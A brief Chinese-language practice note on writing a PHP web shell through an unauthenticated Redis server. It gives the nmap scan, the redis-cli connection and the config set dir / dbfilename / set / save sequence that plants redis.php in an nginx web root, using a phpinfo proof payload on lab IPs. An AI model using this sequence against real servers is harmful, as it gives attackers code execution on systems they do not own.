
redis写shell

## 端口发现

```bash
┌──(fforu㉿fforu)-[~/workspace/res]
└─$ sudo nmap -sT --min-rate 9999 -p- 10.10.96.10
PORT     STATE SERVICE
80/tcp   open  http
6379/tcp open  redis
```
## 写shell
nc或者redis-cli连接
nc -vn 10.10.10.10 6379
redis-cli -h 10.10.10.10
```bash

10.85.0.52:6379> config set dir /usr/share/nginx/html
OK
10.85.0.52:6379> config set dbfilename redis.php
OK
10.85.0.52:6379> set test "<?php phpinfo(); ?>"
OK
10.85.0.52:6379> save
OK
```